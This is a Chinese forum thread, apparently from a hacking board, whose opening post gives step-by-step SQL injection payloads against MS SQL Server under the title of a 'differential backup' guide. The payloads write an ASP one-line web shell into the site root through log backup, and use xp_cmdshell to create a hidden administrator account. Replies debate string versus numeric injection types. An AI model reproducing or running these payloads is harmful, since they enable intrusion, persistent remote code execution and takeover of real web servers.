@@ -1,0 +1,52 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+手工实现差异备份的步骤
+D8888D主贴内容-------------------------------------------------------
+字符型
+1.恢复当前库
+;alter database 当前库 set RECOVERY FULL--
+2.创建表cmd
+;create table cmd (a image)--
+3.备份当前库到D:\cmd1
+;backup log 当前库 to disk = 'D:\cmd1' with init--
+4.插入一句话代码到创建的表cmd
+;insert into cmd (a) values ('<%%25**ecute(request("a"))%%25>')--  
+5.备份一句话代码到站点根目录
+;backup log 当前库 to disk = 'D:\www_web\oct.asp'--
+6.完成
+';drop table 创建的表--
+----------------------------------
+数字型
+1.恢复当前库
+';alter database 当前库 set RECOVERY FULL--
+2.创建表cmd
+';create table cmd (a image)--
+3.备份当前库到D:\cmd1
+';backup log 当前库 to disk = 'D:\cmd1' with init--
+4.插入一句话代码到创建的表cmd
+';insert into cmd (a) values ('<%%25**ecute(request("a"))%%25>')--  
+5.备份一句话代码到站点根目录
+';backup log 当前库 to disk = 'D:\www_web\oct.asp'--
+6.完成
+';drop table 创建的表--
+--------------------------------
+sa权限创建管理员用户
+1.判断是否有注入;and 1=1 ;and 1=2  
+;and user_name()='dbo' 判断当前系统的连接用户是不是sa 
+2.添加系统的管理员
+;exec master.dbo.xp_cmdshell 'net user wk wk90/add';-- 
+;exec master.dbo.xp_cmdshell 'net localgroup administrators wk /add';--
+
+D8888D回贴内容-------------------------------------------------------
+楼主弄错了吧？
+
+第二个才是字符型，第一个是数字型~~xiong141
+
+D8888D回贴内容-------------------------------------------------------
+sql 2005的话是不是有点不一样？
+
+D8888D回贴内容-------------------------------------------------------
+不一样也不可能像楼主说的那样吧？
+
+不一样只是语句变了一点，原理还是没变的，但楼主明显弄错鸟~~
